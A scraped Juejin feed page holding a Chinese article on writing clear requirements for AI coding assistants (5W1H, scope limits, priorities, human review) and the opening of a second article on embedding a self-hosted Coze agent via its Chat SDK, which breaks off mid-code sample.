hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">AI “自动驾驶” 的使用分享</h2>
<h3 data-id="heading-1">一、开场：从 "AI 善后工程师" 说起</h3>
<p>大家有没有遇到过这样的情况：</p>
<p>满怀期待地让 AI 帮你写代码，结果跑出来一堆问题，然后你花了大量时间去修改、调试、善后。最后发现，还不如自己写来得快。</p>
<p>这时候，你就变成了 <strong>"AI 善后工程师"</strong>。</p>
<p>我自己长时间使用以来的一些思考，就是如何跳出这个困境，让 AI 真正成为你的效率倍增器，而不是麻烦制造者。</p>
<hr/>
<h3 data-id="heading-2">二、问题根源：模糊的需求，模糊的结果</h3>
<p>让我们看一个真实的对比案例。</p>
<h4 data-id="heading-3">模糊版本</h4>
<pre><code class="hljs">我想加个导出 Excel 的功能
</code></pre>
<p><strong>结果会怎样？</strong></p>
<p>虽然 AI 和 Spec 也能做，但这个跑出来的结果可想而知。AI 会做大量假设：</p>
<ul>
<li>导出什么数据？哪些字段？</li>
<li>在哪个页面？什么时候触发？</li>
<li>文件格式怎样？命名规则？</li>
<li>有没有数据量限制？</li>
</ul>
<blockquote>
<p>不断的和 AI 拉扯“需求”，然后 AI 也一直被打断需要你不断的 <strong>“澄清”</strong> 事实。 </p>
</blockquote>
<p>AI 执行完成后，你发现 AI 生成的代码需要你不断的修改、补充、调整，就变成了 <strong>"AI 善后工程师"</strong>。
 </p>
<h4 data-id="heading-4">清晰版本</h4>
<pre><code class="hljs language-diff" lang="diff">我想在顾问模块的对账单列表页添加导出 Excel 功能 

Ai 工作流：.windsurf\workflows\add-export-function.md
// 这是 “项目” 中定义的 AI 工作流，可以明确的给 AI 提供上下文信息 

业务背景：
业务每月需要将对账单数据导出给组长，现在只能手动复制，容易出错
 
功能描述：
<span class="hljs-deletion">- 在列表页顶部添加"导出 Excel"按钮</span>
<span class="hljs-deletion">- 导出当前筛选条件下的所有数据（不分页）</span>
<span class="hljs-deletion">- 导出字段：账单号、提交时间、状态...</span>
<span class="hljs-deletion">- 文件名格式：x月对账单_YYYYMMDD.xlsx </span>

用户场景：
<span class="hljs-deletion">- 场景1：用户筛选了某个月份的数据，点击导出，得到该月份的 Excel 文件</span>
<span class="hljs-deletion">- 场景2：用户未筛选，点击导出，得到所有数据的 Excel 文件 </span>

技术偏好：
<span class="hljs-deletion">- 使用项目中已有的 exceljs 库 // 如果没有现成组件，可以明确给 AI</span>
<span class="hljs-deletion">- 导出限制：最多 10000 条数据，超过提示分批导出</span>
</code></pre>
<p><strong>结果？</strong> </p>
<p>AI 能够一次性生成 70-80% 可用的代码，你只需要做少量调整和验证。 </p>
<hr/>
<h3 data-id="heading-5">三、核心方法：如何跳出 "AI 善后工程师"？</h3>
<h4 data-id="heading-6">1. 5W1H 原则 </h4>
<p>这是<strong>产品思维</strong>的基础方法，同样适用于和 AI 沟通： </p>
<ul>
<li>Why（为什么）：业务背景、痛点</li>
<li>What（做什么）：核心功能</li>
<li>Who（谁用）：目标用户角色</li>
<li>Where（在哪）：哪个模块/页面</li>
<li>When（什么时候）：触发时机</li>
<li>How（怎么做）：技术偏好（可选）</li>
</ul>
<h4 data-id="heading-7">2. 明确边界</h4>
<p>告诉 AI 什么要做，什么不要做</p>
<pre><code class="hljs">做：简单的关键字搜索
不做：复杂的高级筛选、搜索历史
</code></pre>
<p>这能避免 AI 过度设计，把简单问题复杂化。 </p>
<h4 data-id="heading-8">3. 提供具体场景</h4>
<p>不要说 "用户字段可以搜索"，而是</p>
<pre><code class="hljs language-arduino" lang="arduino">场景：
<span class="hljs-number">1.</span> 数据列表中，用户输入<span class="hljs-string">"张三"</span>，点击搜索，看到搜索的结果。
<span class="hljs-number">2.</span> 点击 <span class="hljs-string">"张三"</span> 的数据项ID，跳转到详情页。
</code></pre>
<p>具体的场景描述能让 AI 理解完整的用户操作流程。</p>
<h4 data-id="heading-9">4. 说明优先级（如果有多个功能）</h4>
<pre><code class="hljs">P0（必须）：基础搜索功能
P1（重要）：搜索结果高亮
P2（可选）：搜索历史记录
</code></pre>
<p>这样 AI 知道先做什么，避免在次要功能上浪费时间。</p>
<blockquote>
<p>现在 AI <strong>“分析”</strong> 能力强了不少，自然也语言可以工作，但如果你掌握一些 <strong>"提示技巧"</strong>，确实能让 AI 生成更准确的提案，<strong>减少来回澄清的次数，提高效率</strong>。</p>
</blockquote>
<hr/>
<h3 data-id="heading-10">四、理性认知：为什么说迷信 “AI 全自动” 能力是不好的做法？</h3>
<p>我们应该追求的是 <strong>"效率增益"</strong>，而不是 <strong>"一次完美完成"</strong> 的代码。</p>
<blockquote>
<p><strong>关键是考虑显著的实现上的时间节省。</strong></p>
</blockquote>
<h4 data-id="heading-11">AI 最适合的场景：</h4>
<ul>
<li>高重复性/模板化：如 CRUD、DTO转换、前端字段映射</li>
<li>高耗时：纯手工需要超过 2-3 小时的繁琐任务</li>
<li>低风险：非核心生产逻辑</li>
<li>易于验证：容易判断对错，修复成本低
 </li>
</ul>
<h4 data-id="heading-12">AI 不适合的场景： </h4>
<ul>
<li>核心业务逻辑（需要深度理解业务）</li>
<li>复杂的架构设计决策</li>
<li>需要大量上下文的重构工作</li>
<li>安全敏感的代码（需要人工深度审查）</li>
</ul>
<hr/>
<h3 data-id="heading-13">五、最佳实践总结</h3>
<h4 data-id="heading-14">好的做法</h4>
<ul>
<li><strong>明确定义任务范围</strong> - 用 5W1H 描述清楚</li>
<li><strong>聚焦 AI 擅长场景</strong> - 重复性、模板化任务</li>
<li><strong>鼓励先计划再编码</strong> - 使用 OpenSpec 等工作流</li>
<li><strong>提供项目上下文指令</strong> - 通过工作流文件、项目文档</li>
<li><strong>保留人工复核环节</strong> - AI 生成，人工审查</li>
<li><strong>充分利用自动测试</strong> - 用测试验证 AI 代码的正确性</li>
</ul>
<h4 data-id="heading-15">不好的做法</h4>
<ul>
<li><strong>上下文臃肿，不加取舍</strong> - 把整个项目塞给 AI</li>
<li><strong>不写测试直接上</strong> - 无法验证 AI 代码质量</li>
<li><strong>无急停，任其失控</strong> - AI 跑偏了也不及时纠正</li>
<li><strong>忽视 AI 给出的安全扫描</strong> - AI 提示的安全问题不重视</li>
<li><strong>迷信 AI 全自动能力</strong> - 期望 AI 解决所有问题</li>
<li><strong>AI 代码不整理沉淀</strong> - 生成的代码不规范化，技术债累积
 </li>
</ul>
<hr/>
<h3 data-id="heading-16">六、结语：AI 是副驾驶，你是司机</h3>
<p>AI "自动驾驶" 不是让你做甩手掌柜，而是</p>
<ul>
<li><strong>你负责方向</strong>：明确需求、定义边界、把握质量</li>
<li><strong>AI 负责执行</strong>：快速生成代码、处理重复性工作</li>
<li><strong>协同提效</strong>：在合适的场景下，发挥各自优势</li>
</ul>
<p>记住：<strong>好的需求描述 = 好的 AI 输出</strong></p>
<blockquote>
<p>当你从 <strong>"AI 善后工程师"</strong> 变成 <strong>"AI 驾驶员"</strong> 时，你会发现<strong>效率提升</strong>不止一倍。</p>
<p><strong>人机的高效协同</strong>，与 AI 结队编程应是当下最优解。、</p>
</blockquote>
<hr/>
<blockquote>
<p>版权声明：<br/>
本文版权属于作者 林小帅，未经授权不得转载及二次修改。<br/>
转载或合作请在下方留言及联系方式。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[web接入扣子私有化智能体]]></title>    <link>https://juejin.cn/post/7574718964044906546</link>    <guid>https://juejin.cn/post/7574718964044906546</guid>    <pubDate>2025-11-21T03:33:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574718964044906546" data-draft-id="7574105194167255086" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="web接入扣子私有化智能体"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-21T03:33:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一个不会重复的id"/> <meta itemprop="url" content="https://juejin.cn/user/3241810244940952"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            web接入扣子私有化智能体
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3241810244940952/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一个不会重复的id
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T03:33:17.000Z" title="Fri Nov 21 2025 03:33:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>上一篇<a href="https://juejin.cn/post/7573957755369046026" target="_blank" title="https://juejin.cn/post/7573957755369046026">开源版扣子私有化部署</a>，扣子已经部署到我们自己服务器上了，现在还有几个问题要解决。</p>
<ul>
<li>接入私有大模型（上一篇已解决）</li>
<li>发布后能独立被其他Web嵌入,比如做个智能客服被嵌入其他网站</li>
<li>能使用其他官网插件</li>
<li>能自己开发插件</li>
<li>能接入其他智能体</li>
</ul>
<p>这篇文章讲第二点自己的智能体如何被其他web直接调用，有两种方式直接后端api和前端嵌入web页面。</p>
<p>对应发布时的 <code>API</code> 和 <code>Chat SDK</code></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62cbed18e6514ae1b96d38ec83d227e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5Liq5LiN5Lya6YeN5aSN55qEaWQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764300796&amp;x-signature=CYxWWAbDlIaBztCoIl4T6yk9lPA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-0">开发规范</h2>
<p>原文 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcoze-dev%2Fcoze-studio%2Fwiki%2F7.-%25E5%25BC%2580%25E5%258F%2591%25E8%25A7%2584%25E8%258C%2583" target="_blank" title="https://github.com/coze-dev/coze-studio/wiki/7.-%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83" ref="nofollow noopener noreferrer">github.com/coze-dev/co…</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca7af83e0f624007b7c82796913f5a49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5Liq5LiN5Lya6YeN5aSN55qEaWQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764300796&amp;x-signature=%2BMuZjaHqrwZBWpc9IobpMqjA0Ss%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">Chat SDK</h2>
<p>原文 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcoze-dev%2Fcoze-studio%2Fwiki%2F8.-Chat-SDK" target="_blank" title="https://github.com/coze-dev/coze-studio/wiki/8.-Chat-SDK" ref="nofollow noopener noreferrer">github.com/coze-dev/co…</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71ccb708a1bd4e909349173b052308fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5Liq5LiN5Lya6YeN5aSN55qEaWQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764300796&amp;x-signature=CjRp0fuDu278Ko5UJuEjIMNYLWw%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a62c9021271e43968b9f433ff52507ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5Liq5LiN5Lya6YeN5aSN55qEaWQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764300796&amp;x-signature=5Dw%2FVxn1zsyQNP%2FY6oFtDwGkWCQ%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe67804aaa74474fbe319b7ba1f0cba0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5Liq5LiN5Lya6YeN5aSN55qEaWQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764300796&amp;x-signature=Y0c3muuQiNQ8aWuf26UAbFpZgqY%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30f12d21429b44838c30db8470f0f829~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5Liq5LiN5Lya6YeN5aSN55qEaWQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764300796&amp;x-signature=65DM0jSVlr3pxuKwGFpJgyth8%2Bo%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">new</span> CozeWebSDK.<span class="hljs-title function_ invoke__">WebChatClient</span>({
  <span class="hljs-comment">/**
  * Agent or app settings
  * for agent
  * @param config.bot_id - Agent ID.
  * for app
  * @param config.type - To integrate a Coze app, you must set the value to app.
  * @param config.isIframe - Whether to use the iframe method to open the chat box
  * @param config.appInfo.appId - AI app ID.
  * @param config.appInfo.workflowId - Workflow or chatflow ID.
  */</span>
  <span class="hljs-attr">config</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'bot'</span>,
    <span class="hljs-attr">bot_id</span>: <span class="hljs-string">'xxxx'</span>,
    <span class="hljs-attr">isIframe</span>: <span class="hljs-literal">false</span>,
  },
  <span class="hljs-comment">/**
  * The auth property is used to configure the authentication method.
  * @param type - Authentication method, default type is 'unauth', which means no authentication is required; it is recommended to set it to 'token', which means authentication is done through PAT (Personal Access Token) or OAuth.
  * @param token - When the type is set to 'token', you need to configure the PAT (Personal Access Token) or OAuth access key.
  * @param onRefreshToken - When the access key expires, a new key can be set as needed.
  */</span>
  <span class="hljs-attr">auth</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'token'</span>,
    <span class="hljs-attr">token</span>: <span class="hljs-string">'xxxx'</span>,
    <span class="hljs-attr">onRefreshToken</span>: <span class="hljs-title function_ invoke__">async</span> () =&gt; <span class="hljs-string">'token'</span>
  },
  <span class="hljs-comment">/**
  * The userInfo parameter is used to set the display of agent user information in the chat box.
  * @param userInfo.id - ID of the agent user.
  * @param userInfo.url - URL address of the user's avatar.
  * @param userInfo.nickname - Nickname of the agent user.
  */</span>
  <span class="hljs-attr">userInfo</span>: {
    <span class="hljs-attr">id</span>: <span class="hljs-string">'user'</span>,
    <span class="hljs-attr">url</span>: <span class="hljs-string">'https://lf-coze-web-cdn.coze.cn/obj/eden-cn/lm-lgvj/ljhwZthlaukjlkulzlp/coze/coze-logo.png'</span>,
    <span class="hljs-attr">nickname</span>: <span class="hljs-string">'User'</span>,
  },
  <span class="hljs-attr">ui</span>: {
    <span class="hljs-comment">/**
    * The ui.base parameter is used to add the overall UI effect of the chat window.
    * @param base.icon - Application icon URL.
    * @param base.layout - Layout style of the agent chat box window, which can be set as 'pc' or'mobile'.
    * @param base.lang - System language of the agent, which can be set as 'en' or 'zh-CN'.
    * @param base.zIndex - The z-index of the chat box.
    */</span>
    <span class="hljs-attr">base</span>: {
